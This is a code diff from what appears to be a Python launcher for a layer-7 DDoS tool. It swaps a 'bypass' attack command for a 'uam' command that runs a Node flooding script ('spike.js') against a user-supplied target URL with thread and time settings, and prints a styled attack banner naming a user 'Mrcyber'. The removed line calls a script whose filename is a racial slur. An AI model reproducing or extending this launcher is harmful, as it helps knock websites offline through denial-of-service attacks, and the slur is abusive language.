@@ -815,14 +815,12 @@ def main():
 				main()
 			except IndexError:
 				main()
-		elif sinput == "bypass" or sinput == "BYPASS":
+		elif sinput == "uam" or sinput == "UAM":
 			try:
 				url = sin.split()[1]
-				time = sin.split()[2]
-				thread = sin.split()[3]
-                                proxy = sin.split()[4]
-                                rps = sin.split()[5]
-				os.system(f'node HTTP-NIGGA.js {url} {time} {thread} {proxy} {rps}')
+				thread = sin.split()[2]
+				time = sin.split()[3]
+				os.system(f'node spike.js {url} {thread} {time}')
 				os.system ("clear")
 				print(f"""
 \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
@@ -832,11 +830,9 @@ def main():
 \033[35m                ╚╦════════════════════════════════════════════╦╝
 \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
 \033[1;37m                   TARGET   : \033[35m[ \033[1;37m{url} \033[35m]
-\033[1;37m                   THREAD     : \033[35m[ \033[1;37m{time} \033[35m]
-\033[1;37m                   TIME     : \033[35m[ \033[1;37m{thread} \033[35m]
-\033[1;37m                   PROXY     : \033[35m[ \033[1;37m{proxy} \033[35m]
-\033[1;37m                   RPS     : \033[35m[ \033[1;37m{rps} \033[35m]
-\033[1;37m                   LAYER-7   : \033[35m[ \033[1;37mUAM \033[35m]
+\033[1;37m                   THREAD   : \033[35m[ \033[1;37m{thread} \033[35m]
+\033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
+\033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mUAM \033[35m]
 \033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
 \033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
 \033[35m           ╚════════════════════════════════════════════════════════╝
@@ -844,7 +840,7 @@ def main():
 			except ValueError:
 				main()
 			except IndexError:
-				main()		
+				main()	
 					
  
 def login():
